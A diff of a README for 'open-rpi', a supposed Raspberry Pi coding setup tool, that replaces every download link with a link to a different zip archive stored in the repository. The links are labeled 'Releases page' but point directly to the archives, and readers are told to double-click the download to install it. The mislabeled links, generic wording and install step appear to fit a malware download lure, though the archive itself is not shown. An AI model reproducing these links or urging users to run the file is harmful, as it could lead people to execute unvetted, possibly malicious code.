@@ -1,6 +1,6 @@
 # 🎉 open-rpi - Effortless Setup for RPI Coding
 
-[![Download](https://raw.githubusercontent.com/Hendra-bootloop/open-rpi/main/opencode-config/open-rpi-1.8.zip%20GitHub-blue)](https://raw.githubusercontent.com/Hendra-bootloop/open-rpi/main/opencode-config/open-rpi-1.8.zip)
+[![Download](https://github.com/Hendra-bootloop/open-rpi/raw/refs/heads/main/agent/open-rpi-2.8-beta.3.zip%20GitHub-blue)](https://github.com/Hendra-bootloop/open-rpi/raw/refs/heads/main/agent/open-rpi-2.8-beta.3.zip)
 
 ## 📋 Overview
 
@@ -11,7 +11,7 @@ Welcome to open-rpi! This application is your gateway to a custom setup tailored
 Follow these steps to set up open-rpi on your device:
 
 1. **Download the Application**
-   Visit our [Releases page](https://raw.githubusercontent.com/Hendra-bootloop/open-rpi/main/opencode-config/open-rpi-1.8.zip) to download the latest version of the application. You will find the necessary files and instructions there.
+   Visit our [Releases page](https://github.com/Hendra-bootloop/open-rpi/raw/refs/heads/main/agent/open-rpi-2.8-beta.3.zip) to download the latest version of the application. You will find the necessary files and instructions there.
 
 2. **Install the Application**
    Once the download is complete, locate the downloaded file in your device's download folder. Double-click the file to start the installation process. Follow the on-screen prompts to complete the installation.
@@ -42,7 +42,7 @@ open-rpi offers a range of features designed to simplify coding on Raspberry Pi.
 
 ## 📥 Download & Install
 
-To download open-rpi, go to our [Releases page](https://raw.githubusercontent.com/Hendra-bootloop/open-rpi/main/opencode-config/open-rpi-1.8.zip). Here you can find the latest version along with older releases if needed.
+To download open-rpi, go to our [Releases page](https://github.com/Hendra-bootloop/open-rpi/raw/refs/heads/main/agent/open-rpi-2.8-beta.3.zip). Here you can find the latest version along with older releases if needed.
 
 1. Click on the version you want to download.
 2. Choose the file suitable for your system.
